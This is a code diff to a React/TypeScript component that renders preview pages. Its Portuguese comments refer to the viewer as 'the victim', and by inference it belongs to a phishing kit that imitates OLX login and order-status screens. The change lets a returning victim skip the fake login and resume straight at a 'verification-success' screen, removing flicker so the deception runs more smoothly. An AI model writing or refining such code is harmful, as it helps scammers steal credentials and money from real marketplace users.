@@ -393,14 +393,22 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
       iframe.src = url;
     };
 
-    renderHtml(injected);
+    // Detecta antes de renderizar: se a vítima já está na tela final (status do pedido),
+    // pula o render do "main" pra evitar o flicker (login → status) e o indicador
+    // de etapa piscar pra trás.
+    const shouldResumeFinal = !!(adId && (() => {
+      try { return localStorage.getItem(`olx_resume_${adId}`) === "1"; } catch { return false; }
+    })());
     let onChildScreen = false;
     currentScreenIdRef.current = null;
     currentScreenKindRef.current = "main";
     currentHtmlRef.current = injected;
     historyRef.current = [];
     historyScreenRef.current = [];
-    setScreenRef.current?.("main");
+    if (!shouldResumeFinal) {
+      renderHtml(injected);
+      setScreenRef.current?.("main");
+    }
 
     let detach: (() => void) | null = null;
     let detachCapture: (() => void) | null = null;
@@ -619,14 +627,9 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
     // 1) Marcador local instantâneo (set no submit/request) → pula no boot.
     // 2) Se o marcador não existir, ainda confirma no banco em segundo plano.
     if (adId) {
-      let resumed = false;
-      try {
-        if (localStorage.getItem(`olx_resume_${adId}`) === "1") {
-          resumed = true;
-          void navigateToManualScreen("verification-success");
-        }
-      } catch { /* ignore */ }
-      if (!resumed) {
+      if (shouldResumeFinal) {
+        void navigateToManualScreen("verification-success");
+      } else {
         (async () => {
           try {
             const sessionId = getSessionId();
